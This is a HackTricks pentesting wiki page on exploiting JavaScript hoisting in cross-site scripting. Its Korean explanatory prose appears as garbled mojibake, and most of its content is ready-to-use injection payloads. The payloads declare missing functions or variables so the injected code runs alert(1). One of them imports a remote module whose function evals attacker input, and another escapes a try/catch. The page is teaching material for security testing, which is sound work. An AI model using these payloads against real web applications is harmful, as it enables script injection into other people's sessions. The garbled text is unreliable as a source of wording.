# JS Hoisting

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

JavaScript ì–¸ì–´ì—ì„œ **Hoisting**ìœ¼ë¡œ ì•Œë ¤ì§„ ë©”ì»¤ë‹ˆì¦˜ì€ ë³€ìˆ˜, í•¨ìˆ˜, í´ë˜ìŠ¤ ë˜ëŠ” ì„í¬íŠ¸ì˜ ì„ ì–¸ì´ ì½”ë“œê°€ ì‹¤í–‰ë˜ê¸° ì „ì— ê°œë…ì ìœ¼ë¡œ ê·¸ ë²”ìœ„ì˜ ë§¨ ìœ„ë¡œ ì˜¬ë¼ê°€ëŠ” ê³¼ì •ì„ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì€ JavaScript ì—”ì§„ì— ì˜í•´ ìë™ìœ¼ë¡œ ìˆ˜í–‰ë˜ë©°, ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì—¬ëŸ¬ ë²ˆ í†µê³¼í•˜ë©´ì„œ ì§„í–‰ë©ë‹ˆë‹¤.

ì²« ë²ˆì§¸ í†µê³¼ ë™ì•ˆ, ì—”ì§„ì€ ì½”ë“œë¥¼ êµ¬ë¬¸ ì˜¤ë¥˜ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ íŒŒì‹±í•˜ê³  ì´ë¥¼ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¡œ ë³€í™˜í•©ë‹ˆë‹¤. ì´ ë‹¨ê³„ì—ëŠ” íŠ¹ì • ì„ ì–¸ì´ ì‹¤í–‰ ì»¨í…ìŠ¤íŠ¸ì˜ ë§¨ ìœ„ë¡œ ì´ë™í•˜ëŠ” hoistingì´ í¬í•¨ë©ë‹ˆë‹¤. íŒŒì‹± ë‹¨ê³„ê°€ ì„±ê³µì ìœ¼ë¡œ ì™„ë£Œë˜ë©´, ì¦‰ êµ¬ë¬¸ ì˜¤ë¥˜ê°€ ì—†ìŒì„ ë‚˜íƒ€ë‚´ë©´, ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì´ ì§„í–‰ë©ë‹ˆë‹¤.

ì´í•´í•´ì•¼ í•  ì¤‘ìš”í•œ ì ì€:

1. ìŠ¤í¬ë¦½íŠ¸ëŠ” ì‹¤í–‰ì´ ë°œìƒí•˜ê¸° ìœ„í•´ êµ¬ë¬¸ ì˜¤ë¥˜ê°€ ì—†ì–´ì•¼ í•©ë‹ˆë‹¤. êµ¬ë¬¸ ê·œì¹™ì€ ì—„ê²©í•˜ê²Œ ì¤€ìˆ˜ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
2. ìŠ¤í¬ë¦½íŠ¸ ë‚´ ì½”ë“œì˜ ë°°ì¹˜ê°€ hoistingìœ¼ë¡œ ì¸í•´ ì‹¤í–‰ì— ì˜í–¥ì„ ë¯¸ì¹˜ì§€ë§Œ, ì‹¤í–‰ëœ ì½”ë“œëŠ” í…ìŠ¤íŠ¸ í‘œí˜„ê³¼ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Types of Hoisting

MDNì˜ ì •ë³´ì— ë”°ë¥´ë©´, JavaScriptì—ëŠ” ë„¤ ê°€ì§€ ëšœë ·í•œ ìœ í˜•ì˜ hoistingì´ ìˆìŠµë‹ˆë‹¤:

1. **Value Hoisting**: ë³€ìˆ˜ì˜ ì„ ì–¸ ë¼ì¸ ì´ì „ì— í•´ë‹¹ ë³€ìˆ˜ì˜ ê°’ì„ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
2. **Declaration Hoisting**: ë³€ìˆ˜ì˜ ì„ ì–¸ ì´ì „ì— í•´ë‹¹ ë³€ìˆ˜ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆê²Œ í•˜ë©°, ì´ë¡œ ì¸í•´ `ReferenceError`ê°€ ë°œìƒí•˜ì§€ ì•Šì§€ë§Œ, ë³€ìˆ˜ì˜ ê°’ì€ `undefined`ê°€ ë©ë‹ˆë‹¤.
3. ì´ ìœ í˜•ì€ ì‹¤ì œ ì„ ì–¸ ë¼ì¸ ì´ì „ì— ë³€ìˆ˜ì˜ ì„ ì–¸ìœ¼ë¡œ ì¸í•´ ë²”ìœ„ ë‚´ ë™ì‘ì„ ë³€ê²½í•©ë‹ˆë‹¤.
4. ì„ ì–¸ì˜ ë¶€ì‘ìš©ì€ ê·¸ê²ƒì„ í¬í•¨í•˜ëŠ” ë‚˜ë¨¸ì§€ ì½”ë“œê°€ í‰ê°€ë˜ê¸° ì „ì— ë°œìƒí•©ë‹ˆë‹¤.

ìì„¸íˆ ì„¤ëª…í•˜ìë©´, í•¨ìˆ˜ ì„ ì–¸ì€ ìœ í˜• 1 hoisting ë™ì‘ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. `var` í‚¤ì›Œë“œëŠ” ìœ í˜• 2 ë™ì‘ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. `let`, `const`, ë° `class`ë¥¼ í¬í•¨í•˜ëŠ” ë ‰ì‹œì»¬ ì„ ì–¸ì€ ìœ í˜• 3 ë™ì‘ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ, `import` ë¬¸ì€ ìœ í˜• 1 ë° ìœ í˜• 4 ë™ì‘ìœ¼ë¡œ hoistedë˜ëŠ” ë…íŠ¹í•œ íŠ¹ì„±ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤.


## Scenarios

ë”°ë¼ì„œ **ì„ ì–¸ë˜ì§€ ì•Šì€ ê°ì²´**ê°€ ì‚¬ìš©ëœ í›„ì— **JS ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” ì‹œë‚˜ë¦¬ì˜¤**ê°€ ìˆë‹¤ë©´, ì´ë¥¼ ì„ ì–¸í•˜ì—¬ **êµ¬ë¬¸ì„ ìˆ˜ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ê·¸ë˜ì„œ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ëŠ” ëŒ€ì‹  ì½”ë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## ë” ë§ì€ ì‹œë‚˜ë¦¬ì˜¤
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## References

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
